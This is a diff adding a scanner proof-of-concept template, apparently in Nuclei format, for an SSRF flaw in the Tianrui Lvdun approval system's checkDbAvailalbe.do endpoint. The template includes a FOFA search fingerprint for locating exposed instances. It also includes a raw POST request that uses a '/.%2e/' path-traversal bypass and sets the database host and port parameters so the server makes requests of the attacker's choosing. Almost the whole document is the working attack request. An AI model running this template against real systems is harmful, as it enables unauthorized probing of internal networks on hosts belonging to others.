@@ -1,0 +1,36 @@
+id: poc-gdng9wwkd2o85vgz
+info:
+  name: 天锐绿盾审批系统 checkDbAvailalbe.do 存在SSRF漏洞
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/gdng9wwkd2o85vgz'
+  tags: ssrf,2026
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: gdng9wwkd2o85vgz
+    fofa: body="location.href=location.href+\"trwfe\";"||body="天锐绿盾"
+http:
+- raw:
+  - 'POST /trwfe/login.jsp/.%2e/config/checkDbAvailalbe.do HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
+
+    Accept: */*
+
+    Accept-Language: zh-CN,zh;q=0.9
+
+    Connection: close
+
+    Content-Type: application/x-www-form-urlencoded
+
+    Content-Length: 68
+
+
+    dbIp=127.0.0.1&dbPort=8280&dbName=test&dbAccount='
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
